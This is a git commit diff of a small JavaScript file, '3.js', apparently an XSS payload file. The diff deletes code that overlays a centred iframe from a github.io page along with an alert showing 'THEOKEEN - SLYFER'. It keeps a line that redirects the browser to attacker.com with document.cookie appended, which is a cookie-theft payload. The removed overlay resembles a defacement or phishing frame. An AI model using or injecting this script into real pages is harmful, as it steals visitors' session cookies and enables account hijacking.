cc65eae76aa89caeed532c194ebc73aaa3bceb06
Slyfer <67638136+iLSlyfer@users.noreply.github.com>
2026-04-22 05:12:54 -0300

    Update 3.js

--- 3.js
+++ 3.js
@@ -1,16 +1,2 @@
-// Crear un iframe
-var iframe = document.createElement('iframe');
-// Configurar el iframe
-iframe.src = 'https://ilslyfer.github.io/_s7d6_scene7_com/index.html'; // URL del iframe
-iframe.width = '800'; // Ancho del iframe
-iframe.height = '600'; // Altura del iframe
-iframe.style.position = 'absolute';
-iframe.style.top = '50%';
-iframe.style.left = '50%';
-iframe.style.transform = 'translate(-50%, -50%)'; // Centra el iframe
-iframe.style.border = 'none'; // Sin bordes
 
-// Agregar el iframe al cuerpo de la página
-document.body.appendChild(iframe);
-alert("THEOKEEN - SLYFER");
 document.location='//attacker.com?c='+document.cookie;//
